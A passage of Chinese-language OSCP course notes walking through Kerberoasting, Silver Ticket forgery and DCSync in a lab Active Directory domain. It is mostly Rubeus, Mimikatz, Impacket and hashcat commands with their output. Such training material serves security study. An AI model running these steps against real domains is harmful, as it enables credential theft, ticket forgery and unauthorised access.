獲取特定服務帳號的 Ticket，這些 Ticket 是用該帳戶的密碼 hash\
離線破解該 Ticket，從而還原明文密碼。
>[!Note]Key Note:
>- Kerberos 預設不驗證請求者的權限，所以任何 已驗證的用戶 都可以請求 TGS Ticket。
>- TGS Ticket 是使用 SPN 帳戶的密碼 Hash，如果密碼較弱，就可以通過 Hashcat 進行破解。
>- 若 SPN 帳戶擁有高權限（如 Domain Admin 權限），破解密碼後即可獲取更高的存取權限。

如何使用 Rubeus (Windows) 和 impacket-GetUserSPNs (Linux) 來執行 Kerberoasting，然後使用 Hashcat 破解 ticket。

#### 1. Windows：使用 Rubeus 進行 Kerberoasting
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.181.75
```
(Powershell)
```
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast

[*] Roasted hashes written to : C:\Tools\hashes.kerberoast
```
> `kerberoast`：執行 Kerberoasting 攻擊\
`/outfile:hashes.kerberoast`：將獲取的 TGS ticket (TGS-REP Hash) 存儲到 hashes.kerberoast 檔案中。
>> 發現 `iis_service` 這個帳戶 可被 Kerberoasting，並且我們已經成功提取了它的 TGS-REP ticket

#### 1-1 複製 Hash 回 Kali，使用 Hashcat 破解
```
kali@kali:~$ cat hashes.kerberoast
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
...

kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```
> Mode: 13100

開始破解 TGS-REP Hash:
```
┌──(chw㉿CHW)-[~]
└─$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
...
d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
...
```
> iis_service/ `Strawberry1`

#### 2. Linux：使用 impacket-GetUserSPNs 進行 Kerberoasting
使用 impacket-GetUserSPNs 來執行
```
┌──(chw㉿CHW)-[~]
└─$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.181.70 corp.com/pete
[sudo] password for chw: 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation    
----------------------  -----------  --------  --------------------------  --------------------------  -------------
HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156  unconstrained 


[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$6da81cd1a3d459c0d7c1bada07f6414a$7716d53e2abdecf8c7c76790c7065a2ab685f7391909f9a8d5676aea56b9616be1a0b6eef2b4e442f02349ce91d89036219cbb18dd1333c504ba51dea51e9d7e7175fa2ca0a0c5c65511b11f559018b1fb0f4cce2a05ffa3b106cf8fc570581edbc1d5de35c5c0f2eeaf6df5eb574760e023d2ca0f9f2994804b2ebd692367fbb279f1388635f3e1fd2498b9bf7eed113bd2bf6a11f4205a31616d7605941f2f9ac4b220dad98feea37567e857f732e5ae65dee5b41a0f5e81bbccec3e10bcf40633a5e3ca7bff9c4a7bd46ca72df1bd65009cadf5517e5f8a43b24e9741a6fba609f982c7374e83aa5accae99fcceccf1cdd498ca0bf997847581079ae56c2deffcb47cc8a890e977cfa0c5ff3221597981350bfbdc2f18badf0fc78fa5f339c50bd9d65a6bca69bcb839a43ffdda39789767296f7d8cc6a5ae6abc32470b6bf2ea937a83da95863edd098c4be518612a67c522e1f4f652bf12292d62703ef27d7c910446f211862ddd6bf04f3c0eca4f235c4553f2c4d4a4fe4fa5fb6c284dd60270dbbd732e5a72b29d189674aaa7b17d95222c0638e5b5ec7d261cca03a76bcab1bccf26240286044f797169e4e7dca41f4ceb5d15935f166dfb72f53a6c57e12ee04376799b934d27bba9e7028d3a4777423483aded40ece9fd62b2c9e3bc295b5b01ae37e820c3fd35728ef3d32631c4984dbd5efd21380854ef82b5292af747ed2bb9d5270e223b81fa7d165161e9cbeeea72df256f22485c1d078883050869f4111fe885d43a1cdd308cc0844fd7088b195ff88ffff48c4b7086a75c811bcfb9ffbb53459f6b09655d859765c9768ec2a4a73a3f35b46988deb5283e1661ed234baf036deee8b06e432fa400f5974553e692e923f72937b04872c5f77c0f237928ca283fe397306911f003d49cc449c556b0e20f450e187216f752efd8074cf6828a2d732228e94e00cb22b0eeadbbae4862b129e5193696de8696eddee19337967bcec74ee592e5e13e25c58dd3fd927e1da0778a476356fffc855e64cff65df2f48df20c831eb01ea225ef7c62e3a53d566e7f5e70e14dcb2cf9b52cae24f32055942091fbcaa84cbb2d1485bec69f5a627e5c19112a5c9d7c6394c9a7b9e64ff8c438d49c6a6798a147626ca1b5ed4bdfab3dbec77cd69af5d736901294a02f8d03fd0b1089b00c82c3b421245e29970adf7d3b0aa81f0ec551c1214bc59152a4571dec1cfae5bbae4baa7f005093c5e3dc212b9aca75701128cec199fc65b15d150eef975dceb417a1ca50cefe244ac6373b3b8750402239813d8d593b0d0dd304318c4b4a4ab477435bb2d144d84b01bc1d6a1b19f421
```
> `-request`：要求獲取 SPN 服務帳戶的 TGS-REP ticket\
`-dc-ip 192.168.50.70`：指定 Domain Controller 的 IP\
`corp.com/pete`：使用 pete 這個用戶的身份來執行攻擊
>> 成功獲取 `iis_service` 帳戶的 TGS-REP ticket

#### 2-1 使用 Hashcat 破解 TGS-REP Hash
```
┌──(chw㉿CHW)-[~]
└─$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Silver Tickets
在上一章節，取得並破解了 TGS-REP Hash 來檢索 SPN 的明文密碼，接著需要偽造自己的 service tickets。

Silver Ticket 是一種針對 Kerberos 認證機制 的攻擊技術，利用已知的 Service Principal Name (SPN) 服務帳戶的 NTLM Hash，偽造 Kerberos Service Ticket (TGS) 來繞過身份驗證並直接存取特定服務。
>[!Note]
>Silver Ticket attack 概念：
>1. Kerberos Service Ticket (TGS) 是由 服務帳戶的 NTLM Hash 加密，如果攻擊者知道這個 hash 值，就可以偽造 TGS，直接存取該 SPN 服務。
>2. 應用程式通常不會驗證 TGS 的完整性，因為它們假設 TGS 是由 DC 發出的。
>3. 透過 偽造的 TGS (Silver Ticket)：
>- 任意指定身份 (例如：管理員)
>- 存取目標服務 (如 SMB、HTTP、SQL Server)
>- 繞過 Active Directory 驗證，不需要與 DC 交互
>4. PAC ([Privileged Account Certificate](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962)) 驗證：
>- PAC 是一種額外的安全驗證機制，允許服務驗證 TGS 是否由 DC 簽發。
>- 大多數應用程式不會啟用 PAC 驗證，因此 Silver Ticket 攻擊通常可以成功。

當前已取得 iis_service 帳戶的 TGS-REP ticket，將建立一張 Silver Tickets 來存取 HTTP SPN 資源
>[!Important]
>需要收集以下三個資訊來創建 Silver Tickets：
>- SPN password hash
>- Domain SID
>- Target SPN

#### 1. 確認目前使用者無法存取 SPN
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.181.75
```
(Powershell)
```
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
iwr : Server Error
401 - Unauthorized: Access is denied due to invalid credentials.
```
> 確認 jeff 無法存取該網頁(web04)

#### 2. 取得 SPN 服務帳戶的 NTLM hash
利用 Mimikatz 提取 iis_service 服務帳戶的 NTLM Hash
```
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
...
```
> iis_service NTLM Hash: `4d28cf5252d39971419580a51484ca09`

#### 3. 取得 Domain SID
使用 whoami /user 來獲取網域 SID (不包含 RID)
```
PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```
> 網域 SID 為 `S-1-5-21-1987370270-658905905-1781884369`

#### 4. 偽造 Silver Ticket
已收集三個必要資訊：
- SPN password hash: `4d28cf5252d39971419580a51484ca09`
- Domain SID: `S-1-5-21-1987370270-658905905-1781884369`
- Target SPN: `HTTP/web04.corp.com`

使用 Mimikatz 來偽造 Silver Ticket
```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 3/12/2025 1:45:25 AM ; 3/10/2035 1:45:25 AM ; 3/10/2035 1:45:25 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session
```
>`/sid`:：指定 Domain SID\
>`/domain`:：目標網域名稱\
>`/ptt`：直接注入 ticket 到記憶體\
>`/target`:：目標 SPN 伺服器\
>`/service`:：目標 SPN 類型 (http)\
>`/rc4`:：目標 SPN 服務帳戶的 NTLM Hash\
>`/user`:：設定偽造票據中的使用者 (可隨意指定)
>>  成功偽造 Silver Ticket 並載入記憶體

#### 5. 確認偽造的 Kerberos Ticket
可以使用 `klist` 檢查目前的 Kerberos ticket
```
PS C:\Tools> klist

Current LogonId is 0:0x1052fe

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 3/12/2025 1:45:25 (local)
        End Time:   3/10/2035 1:45:25 (local)
        Renew Time: 3/10/2035 1:45:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```
> 已將jeffadmin 存取 http/web04.corp.com 的 Silver Ticket 提交至目前 session，成功注入記憶體，可用於存取目標 SPN。

#### 6. 使用 Silver Ticket 存取目標 Web 伺服器
再次使用 iwr 來嘗試存取 web04，但這次會使用我們偽造的 Kerberos ticket
```
PS C:\Tools> iwr -UseDefaultCredentials http://web04


StatusCode        : 200
StatusDescription : OK
Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                    <head>
                    <meta http-equiv="Content-Type" cont...
RawContent        : HTTP/1.1 200 OK
                    Persistent-Auth: true
                    Accept-Ranges: bytes
                    Content-Length: 759
                    Content-Type: text/html
                    Date: Wed, 12 Mar 2025 08:57:25 GMT
                    ETag: "57a345f2993db1:0"
                    Last-Modified: Wed, 12 Mar 20...
Forms             : {}
Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 759], [Content-Type,
                    text/html]...}
Images            : {@{innerHTML=; innerText=; outerHTML=<IMG alt=IIS src="iisstart.png" width=960 height=600>;
                    outerText=; tagName=IMG; alt=IIS; src=iisstart.png; width=960; height=600}}
InputFields       : {}
Links             : {@{innerHTML=<IMG alt=IIS src="iisstart.png" width=960 height=600>; innerText=; outerHTML=<A
                    href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><IMG alt=IIS
                    src="iisstart.png" width=960 height=600></A>; outerText=; tagName=A;
                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
ParsedHtml        : System.__ComObject
RawContentLength  : 759
```
>  成功繞過身份驗證，存取 Web Server

Microsoft 在 2022 年 10 月 11 日的安全更新，針對 Silver Ticket 和 Golden Ticket 攻擊 進行了防禦加強，主要是透過 更新 [PAC](https://support.microsoft.com/en-gb/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041) (Privileged Account Certificate) 結構 來防止濫用。\
之前，attacker 可以偽造任何使用者的 TGS ticket，甚至創建 AD 裡根本不存在的帳戶 來登入 SPN 服務。在更新後，只有 AD 真實存在的使用者 才能獲得有效的 TGS ticket。

### Domain Controller Synchronization
DCSync 攻擊是一種強大的 Active Directory (AD) 認證攻擊技術，允許攻擊者偽裝成 Domain Controller，並請求 DC 同步使用者帳戶的密碼雜湊 (NTLM Hash)。\
>[!Note]
>**DCSync 攻擊流程**:
>1. AD 網域的多個 DC 之間需要進行同步
>- [Directory Replication Service (DRS) Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47?redirectedfrom=MSDN) 負責讓 DC 之間進行資料同步，確保所有使用者帳戶、群組、權限等資訊保持一致。
>- DC 會透過 [IDL_DRSGetNCChanges API](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) 來請求更新。
>2. DC 不會檢查請求的來源，只會檢查權限
>- DC 並不會確認請求來自合法的網域控制器，只會檢查請求者是否有足夠的權限。
>- 只要擁有 `Replicating Directory Changes`、`Replicating Directory Changes All`、`Replicating Directory Changes in Filtered Set` 這些權限，就能請求同步資料。
>- 預設情況下，這些權限只有 Domain Admins、Enterprise Admins、Administrators 群組的成員擁有。

>[!Important]
>1. 如果攻擊者取得了這些群組的帳號或擁有這些權限的帳號，就能使用 Mimikatz 或 Impacket 的 secretsdump 工具來發起 [DCSync](https://adsecurity.org/?p=2398#MimikatzDCSync) 攻擊。
>2. 透過 DCSync，攻擊者可以 假裝成 DC，並要求同步特定使用者的密碼哈希值。
>3. 成功後，攻擊者就能取得該使用者的 NTLM Hash，進一步進行 離線破解 或 Pass-the-Hash (PTH) 攻擊，直接使用 Hash 進行身份驗證。

#### 1. Windows - 使用 Mimikatz
jeffadmin 是 Domain Admins group 的 member
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.181.75
```
讓 Mimikatz 透過 DCSync 攻擊請求 corp.com 網域的 dave 帳戶密碼 Hash
```
C:\Tools>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 14 2022 15:03:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
  Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
```
>`lsadump::dcsync`: Mimikatz 的 DCSync 模組，用來執行 目錄同步攻擊\
`/user:corp\dave`: 指定目標使用者 dave（corp.com 網域下）
>> dave user credentials: `08d7a47a6f9f66b97b1bae4178747494`

#### 1-1 Hashct 爆破
NTLM mode: 1000
```
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
08d7a47a6f9f66b97b1bae4178747494:Flowers1              
...
```

#### 2. Linux - 使用 Impacket
透過 Linux 直接請求 DC 同步 dave 的密碼 Hash\
擁有 Domain Admin 權限的帳號 (如 jeffadmin) 才會成功
```
┌──(chw㉿CHW)-[~]
└─$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.181.70
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up...
```
>`impacket-secretsdump`: 使用 Impacket 工具來提取帳戶憑證\
`-just-dc-user dave`: 只針對 dave 執行 DCSync 攻擊\
`corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.181.70`: 以 jeffadmin（Domain admin）身分執行攻擊\
`@192.168.181.70` → 指定目標 Domain Controller IP。
>> dave/`08d7a47a6f9f66b97b1bae4178747494`

#### 2-1 Hashct 爆破
NTLM mode: 1000
```
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
# Lateral Movement in Active Directory

>[!Caution]
> HackMD 筆記長度限制，接續 [[OSCP, PEN-200] Instructional notes - Part 7](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%207.md)

# [Link to: "[OSCP, PEN-200] Instructional notes - Part 7"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%207.md)

